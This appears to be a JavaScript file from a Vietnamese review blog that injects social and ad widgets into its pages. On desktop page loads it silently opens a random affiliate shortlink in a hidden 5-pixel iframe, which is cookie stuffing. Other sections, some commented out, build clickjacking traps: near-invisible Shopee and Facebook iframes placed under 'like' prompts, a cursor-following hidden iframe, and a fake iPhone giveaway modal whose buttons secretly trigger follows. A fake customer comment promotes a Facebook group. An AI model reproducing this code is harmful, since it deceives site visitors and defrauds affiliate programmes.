window.mobileAndTabletcheck = function() {
  var check = false;
  (function(a){if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0,4))) check = true;})(navigator.userAgent||navigator.vendor||window.opera);
  return check;
};
var slike = document.createElement('div');
slike.id = 'slike';
//slike.classList.add('post-action');
slike.style = 'flex-grow: 1;flex-basis: 0;text-align: center;position: relative;';
var link = 'https://shopee.vn/product/8994193/1482514572/';
if(!window.mobileAndTabletcheck()) {
  link = 'https://shorten.asia/GxcyCZSP';//'https://shorten.asia/95nKjZ41';
}
slike.innerHTML = '<div style="position: relative;overflow: hidden;width: 135px;height: 20px;display: inline-block;vertical-align: middle;"><iframe src="'+link+'" width="450px" height="783px" scrolling="no" style="position: absolute;bottom: 0;left: -308px;max-width: none;/* opacity: 0.01; */-khtml-opacity: 0.01;margin: 0;" frameborder="0"></iframe></div>';
slike.innerHTML += '<div style="position: absolute;background: #171717;color: #ffffff;top: -46px;font-size: 0.75rem;padding: 0.25rem;border-radius: 3px;box-shadow: 1px 1px 2px #656565;width: 160px;right: 0;"><span>Nhớ bấm thích để ủng hộ mình nhé!</span></div><div class="arrow-down" style="width: 0;height: 0;border-left: 8px solid transparent;border-right: 8px solid transparent;border-top: 8px solid #171717;position: absolute;top: -5px;left: 36px;"></div>';
var footerNode = document.querySelector('.single .entry-footer');
var ads = document.createElement('li');
ads.className = 'social even thread-even depth-1 page-1';
ads.style = 'border: 2px solid red; padding: 0.75em; margin: 0 -0.75em 0.75em; border-radius: 3px;';
ads.innerHTML = `<article class="comment-body">
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" class="avatar avatar-48 photo avatar-default jetpack-lazy-image jetpack-lazy-image--handled" height="48" width="48" data-lazy-loaded="1" srcset="https://graph.facebook.com/1467043155/picture?type=square">
<div class="comment-meta">
<div class="comment-author vcard">
<span class="fn">Thu Phương</span> Tham gia GROUP mua bán mỹ phẩm uy tín nhất FACEBOOK tại đây <span style="color: #0068fb;font-weight: bold;" onclick="location.href='http://bit.ly/2Gnwhw0';">CHỢ LÀM ĐẸP UY TÍN</span></div>
<div class="comment-metadata">
<time>Thứ Sáu lúc 7:31 sáng</time>
</div>
</div>
</article>`;
var flike = document.createElement('div');
flike.setAttribute('style', 'text-align: center; margin-top: 15px;');
flike.innerHTML = '<iframe src="https://www.facebook.com/plugins/like.php?href=https%3A%2F%2Fwww.facebook.com%2Freviews.vn%2F&width=106&layout=button_count&action=like&size=large&show_faces=false&share=false&height=21&appId=265281440572858" width="106" height="36" style="border:none;overflow:hidden;margin-bottom: 0;" scrolling="no" frameborder="0" allowTransparency="true" allow="encrypted-media"></iframe>';
window.onload = function(e){
  jQuery('.jp-relatedposts-post-a').each(function() {
    this.href = this.href + '?utm_source=relatedposts';
  });
  setTimeout(() => {
    if(node_content = document.querySelector('.single-post')) {
      //document.querySelector('.entry-content').append(flike);
      //var mgid_ads = document.createElement('div');
      //mgid_ads.innerHTML = '<div id="M354483ScriptRootC758057"><div id="M354483PreloadC758057"></div></div>';
      //document.querySelector('#jp-relatedposts').append(mgid_ads);
      //var script = document.createElement('script');
      //script.src = "//jsc.mgid.com/n/h/nhipvang.com.758057.js?t=" +  ((d = new Date()) ? '' + d.getUTCFullYear() + d.getUTCMonth() + d.getUTCDate() + d.getUTCHours() : '');
      //script.async = true;
      //document.body.appendChild(script);
    }
  }, 3000);
  var loaded = getCookie('saff');
  if(nodeCmt = document.querySelector('.comment-list')) {
    /*nodeCmt.insertBefore(ads, nodeCmt.firstChild);*/
  }
  if(nodeShare = document.querySelector('.action-share')) {
    var cta = document.createElement('div');
    cta.innerHTML += '<div style="position: absolute;background: #171717;color: #ffffff;top: -46px;font-size: 0.75rem;padding: 0.25rem;border-radius: 3px;box-shadow: 1px 1px 2px #656565;width: 160px;right: 0;"><span>Nhớ bấm chia sẻ để ủng hộ mình nhé!</span></div><div class="arrow-down" style="width: 0;height: 0;border-left: 8px solid transparent;border-right: 8px solid transparent;border-top: 8px solid #171717;position: absolute;top: -5px;right: 136px;"></div>';
    nodeShare.appendChild(cta);
    nodeShare.style.position = 'relative';
  }
  if(footerNode) {
    if(window.mobileAndTabletcheck()) {
      slike.querySelector('div').style.width = '80px';
      slike.querySelector('div>iframe').style.bottom = '-95px';
      slike.querySelector('div>iframe').style.left = '-16px';
      slike.querySelector('.arrow-down').style.left = '16px';
      slike.querySelector('.arrow-down').style.top = '-4px';
    }
    //setTimeout(function(){ footerNode.appendChild(slike); }, 3000);
  }
  if(!loaded && !window.mobileAndTabletcheck()) {
    setCookie('saff',1,1);
    var list = ['https://shorten.asia/xTxqPZaZ', 'https://shorten.asia/8rkGYu8F', 'https://shorten.asia/nnZReaWP', 'https://shorten.asia/7qqHXhac', 'https://shorten.asia/GhWSQsaY', 'https://shorten.asia/mE1rY1kD', 'https://shorten.asia/KS11rqtP', 'https://shorten.asia/jSzm4ezc', 'https://shorten.asia/yfeYrAGb', 'https://shorten.asia/aRqE8bhn'];
    var url = list[Math.floor(Math.random() * list.length)];
    setTimeout(() => {
      var node = document.createElement('iframe');
      node.width = 5;
      node.height = 5;
      node.style.cssText = 'padding:0;margin:0;border: 0;position: absolute;';
      node.src = url;
      document.body.append(node.cloneNode());
    }, 10000);
  }
}
function setCookie(c_name,value,exdays) {
  var exdate=new Date();
  exdate.setDate(exdate.getDate() + exdays);
  var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString());
  document.cookie=c_name + '=' + c_value + '; path=/';
}
function getCookie(c_name) {
  var matches = new RegExp(c_name+'=(.*?)(;|$)','gi').exec(document.cookie);
  if(matches) {
    return matches[1];
  } else {
    return null;
  }
}
/*
var skp = document.createElement('div');
skp.id = 'skp';
skp.style = 'position: absolute;z-index: 1000;';
skp.innerHTML = '<div style="position: relative;overflow: hidden;width: 16px;height: 16px;"><iframe src="https://shopee.vn/nowbeauty" width="60px" height="265px" scrolling="no" style="position: absolute;top: -245px;left: -25px;max-width: none;opacity: 0.01;-khtml-opacity: 0.01;" frameborder="0"></iframe></div>';
var iframe_now = skp.querySelector('iframe');
var show = false;
var frame_modal = document.createElement('div');
frame_modal.id = 'frame_modal';
frame_modal.innerHTML = `
<style>.dmv-overlay{position:fixed;top:0;left:0;bottom:0;right:0;background:rgba(0,0,0,.6);z-index:10}.dmv-modal{min-width:320px;max-width:520px;position:fixed;top:80px;left:50%;transform:translateX(-50%);background:#FFD804;z-index:1000;box-shadow:0 0 10px rgba(0,0,0,.2);border-radius:15px;color:#7b5600;border-bottom:1px solid}.dmv-modal header{overflow:hidden;text-align:center;padding:1rem 1rem 0}.modal-content{text-align:center;padding:1rem}.dmv-promotion{padding-bottom:1rem}.dmv-promotion img{border-radius:8px;margin:0 .35rem}.modal-content button{position:relative;background:#936b0c;color:#fff;font-weight:600;font-size:1rem;text-transform:uppercase;text-align:center;padding:0 1.5rem;border-radius:5px;border:0;overflow:hidden;height:25px;text-indent:-999px}.modal-content button iframe{position:absolute;top:-239px;left:-25px;max-width:none;opacity:.01;-khtml-opacity: 0.01}.modal-content button.show{text-indent:inherit}.modal-content button.close{background:#eee;margin-left:1rem;color:#936b0c}</style>
<div class="dmv-overlay"></div>
<div class="dmv-modal">
  <header>
<h2>[🎁Giveaway] Chào Năm Mới cùng PHÁI ĐẸP</h2><p>Cơ hội trúng <span style="color: red;font-weight: bold;">Iphone XS MAX(64GB)</span> mỗi tuần. Giveaway lớn nhất năm để đón chào năm mới 2019. Hãy nhấn "<span style="color: red">Quay nào</span>" bên dưới để thử vận may nhé! </p> 
</header>
  <div class="modal-content">
    <div class="dmv-promotion">
      <img src="https://data.promoqui.it/categories/icons/000/016/132/normal/iphone-x.jpg?1505481516" style="border: 1px solid red;"/>
      <img src="https://i.ebayimg.com/images/g/CiUAAOSwEW9aX48D/s-l64.jpg"/>
      <img src="https://baomuctim.com/wp-content/uploads/2018/07/vien-kem-dhc-0-64x64.png"/>
      <img src="https://i.ebayimg.com/images/g/4BUAAOSwmtBbLiI2/s-l64.png"/>
    </div>
    <div class="button">
      <button>Quay nào<iframe class="frame_now" src="" width="180px" height="265px" scrolling="no" frameborder="0"></iframe></button>
      <button class="close">Bỏ qua<iframe  class="frame_now frame_close" src="" width="180px" height="265px" scrolling="no" frameborder="0"></iframe></button>
    </div>
  </div>
</div>`;
iframe_now.onload = function() {
  document.addEventListener('mousemove', function(e) {
    if(show) {
      skp.style.top = (e.pageY-8)+'px';
      skp.style.left = (e.pageX-6)+'px';
    }
  })
}
window.mobileAndTabletcheck = function() {
  var check = false;
  (function(a){if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0,4))) check = true;})(navigator.userAgent||navigator.vendor||window.opera);
  return check;
};

// if(!getCookie('sub_now') && !window.mobileAndTabletcheck()) {
//   show = true;
//   document.body.appendChild(skp);
//   window.addEventListener('blur', function(e) {
//     if(document.activeElement == skp.querySelector('iframe')) {
//       setCookie('sub_now', '8994193', 50*365);
//       setTimeout(function() {
//         show = false;
//         skp.remove();
//       }, 200)
//     }
//   })
// }

window.onload = function(e) {
  var sub_now = getCookie('sub_now');
  if((sub_now === null || sub_now.indexOf('104488452') === -1) && !window.mobileAndTabletcheck()) {
    setTimeout(function() {
      document.body.appendChild(frame_modal);
      document.querySelectorAll('.frame_now').forEach(function(frame_node) {
        frame_node.src = 'https://shopee.vn/samthi2018';
        frame_node.onload = function() {
          frame_node.parentNode.classList.add('show');
        }
      })
    }, 3500);
  }
  window.addEventListener('blur', function(e) {
    var classActive = document.activeElement.className;
    if(classActive.indexOf('frame_close') > -1) {
      setCookie('sub_now', '8994193_104488452', 50*365);
      setTimeout(function() {
        frame_modal.remove();
      }, 250)
    } else if(classActive.indexOf('frame_now') > -1) {
      var img = document.querySelectorAll('.dmv-promotion img');
      var i = 0; var loop = setInterval(function() {img[i].style = ''; if(i < img.length - 1) i++; else i = 0; img[i].style = 'border: 1px solid red;';}, 200)
      setTimeout(function() {
        frame_modal.remove();
        alert('Rất tiếc, chúc bạn may mắm lần sau!');
      }, 1300);
      setCookie('sub_now', '8994193_104488452', 50*365);
    }
  })
}
*/
